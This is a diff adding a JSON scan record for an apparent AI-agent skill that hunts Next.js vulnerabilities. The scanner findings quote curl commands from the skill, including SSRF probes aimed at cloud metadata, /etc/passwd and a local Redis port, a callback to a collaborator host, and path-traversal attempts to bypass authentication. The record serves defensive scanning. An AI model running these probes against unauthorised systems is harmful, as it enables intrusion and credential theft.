@@ -1,0 +1,331 @@
+{
+  "id": "elementalsouls__claude-bughunter__skills~hunt-nextjs",
+  "owner": "elementalsouls",
+  "repo": "Claude-BugHunter",
+  "path": "skills/hunt-nextjs",
+  "name": "hunt-nextjs",
+  "description": "Hunt Next.js specific vulnerabilities — Server Actions arbitrary function execution, Middleware auth bypass via static asset paths, ISR cache poisoning, Image Optimization SSRF (/_next/image), RSC payload leakage, getServerSideProps injection, source map exposure, debug endpoint leakage. Use when target runs Next.js 13/14/15 or any React SSR framework.",
+  "stars": 5465,
+  "category": "security",
+  "commit": "3e71af03d48b7bca94a815cfff97431f932748d0",
+  "contentHash": "32d0e76615534e377cde9d4b3f6243bb496809744d63e72badb7293ac5d4114f",
+  "repoCreatedAt": "2026-05-05T11:22:32Z",
+  "alsoFoundIn": [],
+  "status": "ok",
+  "incomplete": false,
+  "scannedAt": "2026-11-06T19:07:48.007Z",
+  "scan": {
+    "findings": [
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-nextjs/SKILL.md",
+        "line": 40,
+        "excerpt": "# Confirm Next.js and get build ID",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nextjs/SKILL.md",
+        "line": 41,
+        "excerpt": "curl -s https://$TARGET/ | grep -oP '\"buildId\":\"[^\"]+\"'",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nextjs/SKILL.md",
+        "line": 42,
+        "excerpt": "curl -sI https://$TARGET/ | grep -i \"x-powered-by\\|x-nextjs\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nextjs/SKILL.md",
+        "line": 45,
+        "excerpt": "BUILD_ID=$(curl -s https://$TARGET/ | grep -oP '\"buildId\":\"\\K[^\"]+')",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nextjs/SKILL.md",
+        "line": 49,
+        "excerpt": "curl -s https://$TARGET/_next/static/chunks/framework*.js | grep -oP '\"next\":\"[^\"]+\"'",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nextjs/SKILL.md",
+        "line": 52,
+        "excerpt": "curl -s \"https://$TARGET/_next/static/chunks/pages/index.js.map\" | head -5",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nextjs/SKILL.md",
+        "line": 53,
+        "excerpt": "curl -s \"https://$TARGET/_next/static/chunks/main.js.map\" | head -5",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-nextjs/SKILL.md",
+        "line": 61,
+        "excerpt": "# Server Actions in Next.js 14+ use x-action-id or Next-Action header",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nextjs/SKILL.md",
+        "line": 63,
+        "excerpt": "curl -s https://$TARGET/ | grep -oP '\"action\":\"[a-f0-9]+\"'",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nextjs/SKILL.md",
+        "line": 67,
+        "excerpt": "curl -s -X POST https://$TARGET/target-page \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-nextjs/SKILL.md",
+        "line": 82,
+        "excerpt": "# Next.js middleware runs on edge runtime and may skip certain paths",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nextjs/SKILL.md",
+        "line": 84,
+        "excerpt": "curl -s -o /dev/null -w \"%{http_code}\" https://$TARGET/admin/dashboard",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nextjs/SKILL.md",
+        "line": 88,
+        "excerpt": "curl -s \"https://$TARGET/_next/data/$BUILD_ID/admin/dashboard.json\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nextjs/SKILL.md",
+        "line": 91,
+        "excerpt": "curl -s \"https://$TARGET/_next/static/../admin/dashboard\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nextjs/SKILL.md",
+        "line": 94,
+        "excerpt": "curl -s \"https://$TARGET/%5Fnext/data/$BUILD_ID/admin/users.json\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nextjs/SKILL.md",
+        "line": 95,
+        "excerpt": "curl -s \"https://$TARGET/_next/data/$BUILD_ID/..%2Fadmin%2Fusers.json\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nextjs/SKILL.md",
+        "line": 103,
+        "excerpt": "curl -s -o /dev/null -w \"%{http_code}\" https://$TARGET/admin/dashboard \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-nextjs/SKILL.md",
+        "line": 103,
+        "excerpt": "curl -s -o /dev/null -w \"%{http_code}\" https://$TARGET/admin/dashboard \\",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-nextjs/SKILL.md",
+        "line": 112,
+        "excerpt": "# Basic SSRF test — internal metadata",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nextjs/SKILL.md",
+        "line": 113,
+        "excerpt": "curl -s \"https://$TARGET/_next/image?url=http://169.254.169.254/latest/meta-data/&w=64&q=75\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target",
+          "169.254.169.254"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nextjs/SKILL.md",
+        "line": 116,
+        "excerpt": "curl -s \"https://$TARGET/_next/image?url=file:///etc/passwd&w=64&q=75\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nextjs/SKILL.md",
+        "line": 117,
+        "excerpt": "curl -s \"https://$TARGET/_next/image?url=http://127.0.0.1:6379/&w=64&q=75\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nextjs/SKILL.md",
+        "line": 121,
+        "excerpt": "curl -s \"https://$TARGET/_next/image?url=$COLLAB/nextjs-ssrf&w=64&q=75\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-nextjs/SKILL.md",
+        "line": 145,
+        "excerpt": "# Enumerate prerendered JSON for user-specific data",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nextjs/SKILL.md",
+        "line": 147,
+        "excerpt": "curl -s \"https://$TARGET/_next/data/$BUILD_ID/profile.json\" \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-nextjs/SKILL.md",
+        "line": 152,
+        "excerpt": "curl -s \"https://$TARGET/_next/data/$BUILD_ID/users/$ID.json\" | head -3",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-nextjs/SKILL.md",
+        "line": 165,
+        "excerpt": "# ISR pages regenerate on request after revalidation period",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-nextjs/SKILL.md",
+        "line": 199,
+        "excerpt": "# First confirm dev mode is actually exposed (anything but 404 = dev server in prod)",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-nextjs/SKILL.md",
+        "line": 215,
+        "excerpt": "# NEXT_PUBLIC_* vars are baked into JS bundles — grep for secrets",
+        "disclosed": false,
+        "automatic": false
+      }
+    ],
+    "findingTotals": {
+      "shell": 9,
+      "network": 30
+    },
+    "score": 92,
+    "band": "low",
+    "rulesVersion": "1.0.0",
+    "filesScanned": 2,
+    "filesSkipped": 0
+  },
+  "history": [
+    {
+      "commit": "3e71af03d48b7bca94a815cfff97431f932748d0",
+      "scannedAt": "2026-11-06T19:07:48.007Z",
+      "score": 92,
+      "rulesVersion": "1.0.0"
+    }
+  ]
+}
